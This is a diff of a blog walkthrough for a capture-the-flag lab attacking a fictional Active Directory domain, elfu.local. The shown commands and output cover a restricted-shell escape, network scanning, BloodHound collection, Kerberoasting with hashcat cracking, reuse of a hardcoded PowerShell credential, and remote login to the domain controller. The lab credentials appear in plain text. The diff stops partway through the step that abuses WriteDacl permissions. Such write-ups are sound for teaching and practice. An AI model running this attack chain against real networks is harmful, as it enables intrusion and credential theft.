@@ -96,7 +96,7 @@
                     <h2 class="subheading">Walkthrough</h2>
                     
                     
-                    <span class="meta">Posted on January 11, 2022</span>
+                    <span class="meta">Posted on January 21, 2022</span>
                     
 
                 </div>
@@ -175,6 +175,25 @@
 </ul>
 </li>
 <li class="toc-entry toc-h2"><a href="#7---printer-exploitation">7 - Printer Exploitation</a></li>
+<li class="toc-entry toc-h2">
+<a href="#8---kerberoasting-on-an-open-fire">8 - Kerberoasting on an open fire</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#registration">Registration</a></li>
+<li class="toc-entry toc-h3"><a href="#exit-students-grade-terminal">Exit Students Grade Terminal</a></li>
+<li class="toc-entry toc-h3"><a href="#exfiltrate-bloodhound-information">Exfiltrate Bloodhound information</a></li>
+<li class="toc-entry toc-h3"><a href="#enumerating-smb-shares">Enumerating SMB Shares</a></li>
+<li class="toc-entry toc-h3"><a href="#search-for-kerberoastable-accounts">Search for kerberoastable Accounts</a></li>
+<li class="toc-entry toc-h3"><a href="#retrieve-hash-from-kerberoastable-account">Retrieve Hash from kerberoastable Account</a></li>
+<li class="toc-entry toc-h3"><a href="#cracking-the-hash">Cracking the hash</a></li>
+<li class="toc-entry toc-h3"><a href="#search-for-credentials">Search for Credentials</a></li>
+<li class="toc-entry toc-h3"><a href="#analysis-of-remote_elf">Analysis of remote_elf</a></li>
+<li class="toc-entry toc-h3"><a href="#log-into-domain-controller">Log into Domain Controller</a></li>
+<li class="toc-entry toc-h3"><a href="#find-writedacl-for-research-samba-share">Find WriteDACL for Research Samba Share</a></li>
+<li class="toc-entry toc-h3"><a href="#add-genericall-to-remote_elf-account">Add GenericAll to remote_elf Account</a></li>
+<li class="toc-entry toc-h3"><a href="#add-your-account-to-research-department-group">Add your account to Research Department group</a></li>
+<li class="toc-entry toc-h3"><a href="#retrieve-document-from-research-share">Retrieve document from research share</a></li>
+</ul>
+</li>
 <li class="toc-entry toc-h2">
 <a href="#9---splunk">9 - Splunk</a>
 <ul>
@@ -765,6 +784,634 @@ Troll_Pay_Chart.xlsx
 
 <pre><code class="bash">Troll_Pay_Chart.xlsx</code></pre>
 
+<h2 id="8---kerberoasting-on-an-open-fire">
+<a class="anchor" href="#8---kerberoasting-on-an-open-fire" aria-hidden="true"><span class="octicon octicon-link"></span></a>8 - Kerberoasting on an open fire</h2>
+
+<p>For this challenge I recommend to use Kali or at least a linux based system where you install the needed tools (cewl, bloodhound, ssh-client).</p>
+
+<h3 id="registration">
+<a class="anchor" href="#registration" aria-hidden="true"><span class="octicon octicon-link"></span></a>Registration</h3>
+
+<p>First open <a href="https://register.elfu.org/" target="_blank" rel="noopener noreferrer">https://register.elfu.org/</a> in the browser. Enter stuff until the lines below “First Name”, “Last Name” and “Email” turn from black to green.</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0010_browser_login.png" width="100%" alt="browser login"></p>
+
+<p>Answer the questions that you are not a robot.</p>
+
+<p>And finally click at “submit”.</p>
+
+<p>You get information on how to login like:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0020_registration_infos.png" width="100%" alt="registration infos"></p>
+
+<p>So let’s do it:</p>
+
+<pre><code>ssh euisvijnqm@grades.elfu.org -p 2222</code></pre>
+
+<p>and enter the given password.</p>
+
+<h3 id="exit-students-grade-terminal">
+<a class="anchor" href="#exit-students-grade-terminal" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exit Students Grade Terminal</h3>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0030_students_grade_terminal.png" width="100%" alt="students grade terminal"></p>
+
+<p>To exit type: Ctrl+D</p>
+
+<pre><code class="python">: Traceback (most recent call last):
+File "/opt/grading_system", line 41, in &lt;module&gt;
+main()
+File "/opt/grading_system", line 26, in main
+a = input(": ").lower().strip()
+EOFError</code></pre>
+
+<p>To get the shell enter</p>
+
+<pre><code class="python">os.system('/bin/bash');</code></pre>
+
+<p>There is a hint from Eve Snowshoes</p>
+
+<figure>
+  <blockquote>
+    <p>There will be some 10.X.X.X networks in your routing tables that may be interesting. Also, consider adding -PS22,445 to your nmap scans to “fix” default probing for unprivileged scans.</p>
+  </blockquote>
+</figure>
+
+<p>So we look at the routes:</p>
+
+<pre><code class="bash">ip route
+default via 172.17.0.1 dev eth0 
+10.128.1.0/24 via 172.17.0.1 dev eth0 
+10.128.2.0/24 via 172.17.0.1 dev eth0 
+10.128.3.0/24 via 172.17.0.1 dev eth0 
+172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.5 </code></pre>
+
+<p>nmap is preinstalled - nice!</p>
+
+<pre><code class="bash">nmap --version
+Nmap version 7.80 ( https://nmap.org )
+Platform: x86_64-pc-linux-gnu
+Compiled with: liblua-5.3.3 openssl-1.1.1d nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.9.1 nmap-libdnet-1.12 ipv6
+Compiled without:
+Available nsock engines: epoll poll select
+</code></pre>
+
+<p>Now scan to find the domain controller:</p>
+
+<pre><code class="bash">nmap -p389 -sV 10.128.1-3.0/24 --open
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-21 20:47 UTC
+Nmap scan report for 10.128.3.30
+Host is up (0.0020s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    (Anonymous bind OK)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 768 IP addresses (237 hosts up) scanned in 33.52 seconds
+</code></pre>
+
+<p>What domain do we have?</p>
+
+<pre><code class="bash">nmap -sC -p 139,445 -sV 10.128.3.30
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-21 20:51 UTC
+Nmap scan report for 10.128.3.30
+Host is up (0.00026s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ELFU)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ELFU)
+Service Info: Host: SHARE30
+
+Host script results:
+|_nbstat: NetBIOS name: SHARE30, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: share30
+|   NetBIOS computer name: SHARE30\x00
+|   Domain name: elfu.local
+|   FQDN: share30.elfu.local
+|_  System time: 2022-01-21T20:51:20+00:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-01-21T20:51:20
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds
+</code></pre>
+
+<p>So the domain name is:</p>
+
+<pre><code class="bash">elfu.local</code></pre>
+
+<h3 id="exfiltrate-bloodhound-information">
+<a class="anchor" href="#exfiltrate-bloodhound-information" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exfiltrate Bloodhound information</h3>
+
+<p>Python is installed so we should get <a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener noreferrer">python based ingestor for Bloodhound</a> running.</p>
+
+<p>Before that, we should set the terminal to have unlimited scrollback: <a href="https://askubuntu.com/questions/385901/how-to-see-more-lines-in-the-terminal" target="_blank" rel="noopener noreferrer">https://askubuntu.com/questions/385901/how-to-see-more-lines-in-the-terminal</a></p>
+
+<p>Unzip is installed at the target:</p>
+
+<pre><code class="bash">unzip
+UnZip 6.00 of 20 April 2009, by Debian. Original by Info-ZIP.
+...
+</code></pre>
+
+<p>Download the zip file for the ingestor:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0040_download_bloodhound_py_ingestor_zip.png" width="100%" alt="Download Bloodhound Python Ingestor Zip"></p>
+
+<p>Take your downloaded zip at the command line:</p>
+
+<pre><code class="bash">cat BloodHound.py-master.zip | base64 | tr -d '\n'
+</code></pre>
+
+<pre><code class="bash">UEsDBAoAAAAAAEgR/FIAAAAAAAAAAAAAAAAVAA...
+...BACgANmZlNzUzZWZkMDk1ODc5YjU0ZDdkNDg4ZGNjM2I0M2EwYjU1NTJlOQ==
+</code></pre>
+
+<p>Copy this output and paste it into the ssh session after:</p>
+
+<pre><code class="bash">echo -n '...
+</code></pre>
+
+<p>Close everything with:</p>
+
+<pre><code class="bash">...' | base64 --decode &gt; bloodhound.zip
+</code></pre>
+
+<p>So the command looks like:</p>
+
+<pre><code class="bash">echo -n 'UEsDBAoAAAAAAEgR/F...
+...Dg4ZGNjM2I0M2EwYjU1NTJlOQ==' | base64 --decode &gt; bloodhound.zip
+</code></pre>
+
+<p>Check the file:</p>
+
+<pre><code class="bash">file bloodhound.zip 
+bloodhound.zip: Zip archive data, at least v1.0 to extract
+</code></pre>
+
+<p>Unzip it:</p>
+
+<pre><code class="bash">unzip bloodhound.zip 
+Archive:  bloodhound.zip
+6fe753efd095879b54d7d488dcc3b43a0b5552e9
+   creating: BloodHound.py-master/
+  inflating: BloodHound.py-master/.editorconfig
+...
+  inflating: BloodHound.py-master/bloodhound/lib/cstruct.py  
+  inflating: BloodHound.py-master/setup.py
+</code></pre>
+
+<p>And give it a try:</p>
+
+<pre><code class="bash">cd BloodHound.py-master/
+python3 bloodhound.py -c All -d elfu.local -u euisvijnqm -p 'Szpbpjuqs@'
+INFO: Found AD domain: elfu.local
+INFO: Connecting to LDAP server: dc01.elfu.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 238 computers
+INFO: Connecting to LDAP server: dc01.elfu.local
+INFO: Found 230 users
+INFO: Found 54 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.elfu.local
+INFO: Querying computer: share30.elfu.local
+INFO: Skipping enumeration for share30.elfu.local since it could not be resolved.
+INFO: Done in 00M 02S
+</code></pre>
+
+<p>You get 4 json files:</p>
+
+<pre><code class="bash">ls
+20220121223233_computers.json  20220121223233_groups.json  Dockerfile  README.md   bloodhound.py
+20220121223233_domains.json    20220121223233_users.json   LICENSE     bloodhound  setup.py
+</code></pre>
+
+<p>Cat all the 4 files and copy them to your computer,e.g.:</p>
+
+<pre><code class="bash">cat 20220121223233_computers.json
+{"computers":[{"ObjectIdentifier": "S-1-5-21-2037236562...
+..."computers","count":2, "version":3}}
+</code></pre>
+
+<p>Import the files in bloodhound in kali using drag and drop.</p>
+
+<h3 id="enumerating-smb-shares">
+<a class="anchor" href="#enumerating-smb-shares" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumerating SMB Shares</h3>
+
+<p>Run</p>
+
+<pre><code class="bash">nmap --script smb-enum-shares -p139,445 10.128.1-3.0/24 --open
+</code></pre>
+
+<p>In the result the shares in 10.128.2.0/24 seems only the IPC open:</p>
+
+<pre><code class="bash">smbclient -L 10.128.2.196
+Enter WORKGROUP\euisvijnqm's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Remote IPC)
+SMB1 disabled -- no workgroup available
+</code></pre>
+
+<p>In 10.128.3.0/24 the Users seems to have a Share “ElfUFiles”:</p>
+
+<pre><code class="bash">smbclient -L 10.128.3.41
+Enter WORKGROUP\euisvijnqm's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ElfUFiles       Disk      
+	IPC$            IPC       IPC Service (Remote IPC)
+SMB1 disabled -- no workgroup available
+</code></pre>
+
+<p>which is not accessible from your current user:</p>
+
+<pre><code class="bash">smbclient -U euisvijnqm //10.128.3.41/ElfUFiles
+Enter WORKGROUP\euisvijnqm's password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</code></pre>
+
+<p>Only the domain controller has multiple shares (excerpt from the previous nmap scan):</p>
+
+<pre><code class="bash">Nmap scan report for 10.128.3.30
+Host is up (0.0020s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: &lt;blank&gt;
+|   \\10.128.3.30\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Samba 4.3.11-Ubuntu)
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.128.3.30\elfu_svc_shr: 
+|     Type: STYPE_DISKTREE
+|     Comment: elfu_svc_shr
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\elfu_svc_shr
+|     Anonymous access: &lt;none&gt;
+|   \\10.128.3.30\netlogon: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\sysvol\elfu.local\scripts
+|     Anonymous access: &lt;none&gt;
+|   \\10.128.3.30\research_dep: 
+|     Type: STYPE_DISKTREE
+|     Comment: research_dep
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\research_dep
+|     Anonymous access: &lt;none&gt;
+|   \\10.128.3.30\sysvol: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\sysvol
+|_    Anonymous access: &lt;none&gt;
+</code></pre>
+
+<h3 id="search-for-kerberoastable-accounts">
+<a class="anchor" href="#search-for-kerberoastable-accounts" aria-hidden="true"><span class="octicon octicon-link"></span></a>Search for kerberoastable Accounts</h3>
+
+<p>To find kerberoastable Accounts click “List all Kerberoastable Accounts” in Bloodhound:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0500_kerberoastable_accounts.png" width="100%" alt="Kerberoastable Accounts"></p>
+
+<h3 id="retrieve-hash-from-kerberoastable-account">
+<a class="anchor" href="#retrieve-hash-from-kerberoastable-account" aria-hidden="true"><span class="octicon octicon-link"></span></a>Retrieve Hash from kerberoastable Account</h3>
+
+<p>Use the <a href="https://www.youtube.com/watch?v=iMh8FTzepU4&amp;t=8m10s" target="_blank" rel="noopener noreferrer">recommendation in the accompanying talk from Chris Davis</a>: Impacket GetUserSPNs.py which is preinstalled at the system:</p>
+
+<pre><code class="bash">GetUserSPNs.py -request elfu.local/euisvijnqm:'Szpbpjuqs@'
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  --------  --------------------------  ---------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+
+
+
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$3b8049ad5ede0e6a1e723fa87cd7484e$57813c60e96a46191bd3425b1d29e3521deb4674ff3c6727756001f6a7096aebcb8718982c13483324ab27e3a2f1cef80b00eea313d98247d680328d3a0d78b2a018300f872842e64971133c9af1e69ba4de374c5b31f4cb178a59c0f1a9a7c00f84e4d4c8a99d08b9bfe8287f29ffb8c4d73fc605d491ef5c429cf745d52a3b31c7d183f46da6684c6934300b1224ab7da8b8a2adee9b2fbf762e2f0f02684cfa1a4cf2623e2e3bd8a789709f8d6009ddf5644ac8066a0d245b0910f1dbcc6a81bb168884dd71ccdeef64ae22dde339d50d6bc06f5580a0bfab12dd5162d6ab46c4214642925965ed2ce5c99d1ab79c1bf9b4020a108aaf9b7d057b731e71225a0ed94a5a8cbfee314831da208af6848f2d996435a12c2109a8243f6d2239fbf603bc1af5c6e525bc6a80f0557f6a4ad6393ba1de9d8346c6302ee628a1dc9fd9d29d9af2540a6c652a0772902c1ba4ca9fa0637a0f2f8d09e767bf3dde8810d824cd4be22d5956acc7211a9836afb54cdf7be518faac57e0678ad16a6725a2c735155dd660a7b9639c457654f0829b29447e849e87923b408c1c0ee26e54eac3dd10224798d39a9c7b0731390156a4d4e9f007259338895d754600baf2cbf1ed1560ac074bfe7f85fafe9dfd39b43e2ee49469228e7a1a23ea29555b8700d5baee89d2db9fe09d6919a4524754a2cd51737aec3cc64e67143a65abc064a3a2245468ac677b1858552f63ce63e88ccf4b3a9eb4c636bbea2199d80c3e29dd677f5c2f5b811c768690ad4a5b8ba3696b5aa3cc45cfd3232138a8209354b2c8d3ff89c0d904ecdd93c1ce9137b4a55e72eed9e347e9e4815efbb96cf0c8ea791374128e4a83529265759979b8cc85e7b07d833f4f0f68fee28d1c6ba73783d307915c578d2498ebe3cd3002097d78f72bf0be174a7b133dfb50badc1fe4759d849450788eab7191d3de4bb06fb02d6ee7f279b48933cb79b6a619c75da29ca53e1e526324d5b52f4e31582b74a8eafedb889369e965a649e53a35c3d0eff157476c71b9a0a38755a1e49b756ac0e6407d383bcad7795a19a6e48eea2b1b1e18a048261b12c25804fbec89a0886af641c4e5295ee302b638ec865fd64fe0d304a9a4195b76c032ec3ec41933fe7c00619e509f1e313865621d755868f311d9c6d511b8f6d749a00e5baf2661732c52f792e0499e891f04ec4bfcdc34fd9702a93aa7b0fd0860c2ead117733baf00b0a14df0b4956e786edbc6495ca082b381a71e573bedd8e4b2e5e3539dbc9eca0bf92fee113dc757ad2553e21400bb175a70999ef81d94be390f125c35135587f14e62a566660876c41deac577407eb8a7fdf53f11d57336230d624779ad747b8214c56c9a3725c1b6323f3945fd38749869361649998c739516d1b4b22b4fd230bb14d3349d25004ac240b12b2275b1c0eb89c1a56813be
+</code></pre>
+
+<p>Copy the hash at the end to your local system into a file hash.txt</p>
+
+<h3 id="cracking-the-hash">
+<a class="anchor" href="#cracking-the-hash" aria-hidden="true"><span class="octicon octicon-link"></span></a>Cracking the hash</h3>
+
+<p>Get all the words including numbers from the initial registration page:</p>
+
+<pre><code class="bash">cewl -w wordlist.txt --with-numbers 'https://register.elfu.org/register'
+</code></pre>
+
+<p>and download a ruleset to augment this list (a further hint from Eve Snowshoes):</p>
+
+<pre><code class="bash">curl -O https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
+</code></pre>
+
+<p>Then crack the hash using hashcat:</p>
+
+<pre><code class="bash">hashcat -m 13100 -a 0 hash.txt --potfile-disable --opencl-device-types 1 --force -O -w 4 -r OneRuleToRuleThemAll.rule wordlist.txt
+...
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$3b8049ad5ede0e6a1e723fa87cd7484e$57813c60e96a46191bd3425b1d29e3521deb4674ff3c6727756001f6a7096aebcb8718982c13483324ab27e3a2f1cef80b00eea313d98247d680328d3a0d78b2a018300f872842e64971133c9af1e69ba4de374c5b31f4cb178a59c0f1a9a7c00f84e4d4c8a99d08b9bfe8287f29ffb8c4d73fc605d491ef5c429cf745d52a3b31c7d183f46da6684c6934300b1224ab7da8b8a2adee9b2fbf762e2f0f02684cfa1a4cf2623e2e3bd8a789709f8d6009ddf5644ac8066a0d245b0910f1dbcc6a81bb168884dd71ccdeef64ae22dde339d50d6bc06f5580a0bfab12dd5162d6ab46c4214642925965ed2ce5c99d1ab79c1bf9b4020a108aaf9b7d057b731e71225a0ed94a5a8cbfee314831da208af6848f2d996435a12c2109a8243f6d2239fbf603bc1af5c6e525bc6a80f0557f6a4ad6393ba1de9d8346c6302ee628a1dc9fd9d29d9af2540a6c652a0772902c1ba4ca9fa0637a0f2f8d09e767bf3dde8810d824cd4be22d5956acc7211a9836afb54cdf7be518faac57e0678ad16a6725a2c735155dd660a7b9639c457654f0829b29447e849e87923b408c1c0ee26e54eac3dd10224798d39a9c7b0731390156a4d4e9f007259338895d754600baf2cbf1ed1560ac074bfe7f85fafe9dfd39b43e2ee49469228e7a1a23ea29555b8700d5baee89d2db9fe09d6919a4524754a2cd51737aec3cc64e67143a65abc064a3a2245468ac677b1858552f63ce63e88ccf4b3a9eb4c636bbea2199d80c3e29dd677f5c2f5b811c768690ad4a5b8ba3696b5aa3cc45cfd3232138a8209354b2c8d3ff89c0d904ecdd93c1ce9137b4a55e72eed9e347e9e4815efbb96cf0c8ea791374128e4a83529265759979b8cc85e7b07d833f4f0f68fee28d1c6ba73783d307915c578d2498ebe3cd3002097d78f72bf0be174a7b133dfb50badc1fe4759d849450788eab7191d3de4bb06fb02d6ee7f279b48933cb79b6a619c75da29ca53e1e526324d5b52f4e31582b74a8eafedb889369e965a649e53a35c3d0eff157476c71b9a0a38755a1e49b756ac0e6407d383bcad7795a19a6e48eea2b1b1e18a048261b12c25804fbec89a0886af641c4e5295ee302b638ec865fd64fe0d304a9a4195b76c032ec3ec41933fe7c00619e509f1e313865621d755868f311d9c6d511b8f6d749a00e5baf2661732c52f792e0499e891f04ec4bfcdc34fd9702a93aa7b0fd0860c2ead117733baf00b0a14df0b4956e786edbc6495ca082b381a71e573bedd8e4b2e5e3539dbc9eca0bf92fee113dc757ad2553e21400bb175a70999ef81d94be390f125c35135587f14e62a566660876c41deac577407eb8a7fdf53f11d57336230d624779ad747b8214c56c9a3725c1b6323f3945fd38749869361649998c739516d1b4b22b4fd230bb14d3349d25004ac240b12
+...
+b2275b1c0eb89c1a56813be:Snow2021!
+</code></pre>
+
+<p>So the password for elfu_svc is ‘Snow2021!’</p>
+
+<h3 id="search-for-credentials">
+<a class="anchor" href="#search-for-credentials" aria-hidden="true"><span class="octicon octicon-link"></span></a>Search for Credentials</h3>
+
+<p>If you remember we had a share</p>
+
+<pre><code class="bash">|   \\10.128.3.30\elfu_svc_shr: 
+</code></pre>
+
+<p>in the previous nmap smb enumeration scan at the domain controller.</p>
+
+<p>So let’s connect there using the newly retrieved credentials and download the files:</p>
+
+<pre><code class="bash">smbclient -U elfu_svc -W elfu.local //10.128.3.30/elfu_svc_shr
+Enter ELFU.LOCAL\elfu_svc's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Jan 21 08:02:40 2022
+  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021
+  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021
+  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021
+  ...
+  AzureAD.ps1                         N      141  Wed Oct 27 19:12:43 2021
+  Copy-FileToRemoteComputer.ps1       N     3794  Wed Oct 27 19:12:43 2021
+  New-NavContainerTenant.ps1          N     5623  Wed Oct 27 19:12:43 2021
+
+		41089256 blocks of size 1024. 34796848 blocks available
+smb: \&gt; prompt
+smb: \&gt; recurse
+smb: \&gt; mget *
+getting file \Get-NavArtifactUrl.ps1 of size 2018 as Get-NavArtifactUrl.ps1 (1970.5 KiloBytes/sec) (average 1970.7 KiloBytes/sec)
+...
+getting file \New-NavContainerTenant.ps1 of size 5623 as New-NavContainerTenant.ps1 (5490.7 KiloBytes/sec) (average 7293.7 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
+
+<p>If we look into the files we can find hardcoded credentials in GetProcessInfo:</p>
+
+<pre><code class="bash">cat GetProcessInfo.ps1 
+$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+</code></pre>
+
+<p>Lets copy this code and enhance it to get a powershell session to this User “remote_elf” IP 10.128.1.53 (using the information at <a href="https://github.com/chrisjd20/hhc21_powershell_snippets#added-bonus-here-is-how-you-can-enter-pssession-into-a-remote-computer" target="_blank" rel="noopener noreferrer">
+https://github.com/chrisjd20/hhc21_powershell_snippets#added-bonus-here-is-how-you-can-enter-pssession-into-a-remote-computer</a>):</p>
+
+<pre><code class="bash">euisvijnqm@grades:~$ powershell
+PowerShell 7.2.0-rc.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS /home/euisvijnqm&gt; $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+PS /home/euisvijnqm&gt; $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+PS /home/euisvijnqm&gt; $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+PS /home/euisvijnqm&gt; Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt;
+</code></pre>
+
+<h3 id="analysis-of-remote_elf">
+<a class="anchor" href="#analysis-of-remote_elf" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis of remote_elf</h3>
+
+<p>Enter the name in Bloodhound:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0600_analysis_remote_elf.png" width="100%" alt="Analysis of Remote Elf in Bloodhound"></p>
+
+<p>Mark it as owned:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0700_Mark_remote_elf_as_owned.png" width="100%" alt="Mark remote elf as owned"></p>
+
+<p>Click “Shortest Path from Owned Principals”, “ELFU.LOCAL” and “REMOTE_ELF@ELFU.LOCAL”:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0800_Shortest_Path_Owned.png" width="100%" alt="Shortest Path from Owned Principals"></p>
+
+<p>In the resulting graph you can see that remote_elf can PowerShell remote to the Domain Controller named DC01.ELFU.LOCAL:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_0900_CanPSRemote.png" width="100%" alt="Can PS Remote"></p>
+
+<h3 id="log-into-domain-controller">
+<a class="anchor" href="#log-into-domain-controller" aria-hidden="true"><span class="octicon octicon-link"></span></a>Log into Domain Controller</h3>
+
+<p>So exit the current PowerShell Session and reenter the session into the Domain Controller using:</p>
+
+<pre><code class="powershell">[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt;exit
+PS /home/euisvijnqm&gt; Enter-PSSession -ComputerName DC01.ELFU.LOCAL -Credential $aCred -Authentication Negotiate
+[DC01.ELFU.LOCAL]: PS C:\Users\remote_elf\Documents&gt;
+</code></pre>
+
+<h3 id="find-writedacl-for-research-samba-share">
+<a class="anchor" href="#find-writedacl-for-research-samba-share" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find WriteDACL for Research Samba Share</h3>
+
+<p>If you remember there was the research samba share at the Domain Controller:</p>
+
+<pre><code class="bash">[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; exit
+PS /home/euisvijnqm&gt; Enter-PSSession -ComputerName DC01.ELFU.LOCAL -Credential $aCred -Authentication Negotiate
+[DC01.ELFU.LOCAL]: PS C:\Users\remote_elf\Documents&gt;
+</code></pre>
+
+<p>but we have no access to it (Open another ssh session):</p>
+
+<pre><code class="bash">smbclient -U euisvijnqm //10.128.3.30/research_dep 
+Enter WORKGROUP\euisvijnqm's password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</code></pre>
+
+<p>Back in the DC Powershell Session try to find a Securable Object which has permissions to write ACL.</p>
+
+<p>For that analyse the existing groups:</p>
+
+<pre><code class="powershell">Get-ADGroup -Filter "*"
+...
+Get-ADGroup -Filter "Name -like '*research*'"
+
+
+DistinguishedName : CN=Research Department,CN=Users,DC=elfu,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+Name              : Research Department
+ObjectClass       : group
+ObjectGUID        : 8dd5ece3-bdc8-4d02-9356-df01fb0e5f3d
+SamAccountName    : ResearchDepartment
+SID               : S-1-5-21-2037236562-2033616742-1485113978-1108
+</code></pre>
+
+<p>So use this to analyse the ACL properties (based on <a href="https://github.com/chrisjd20/hhc21_powershell_snippets#you-can-read-the-dacl-of-an-ad-group-object-using" target="_blank" rel="noopener noreferrer">https://github.com/chrisjd20/hhc21_powershell_snippets#you-can-read-the-dacl-of-an-ad-group-object-using</a>):</p>
+
+<pre><code class="powershell">
+$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+</code></pre>
+
+<p>which contains</p>
+
+<pre><code class="powershell">ActiveDirectoryRights : WriteDacl
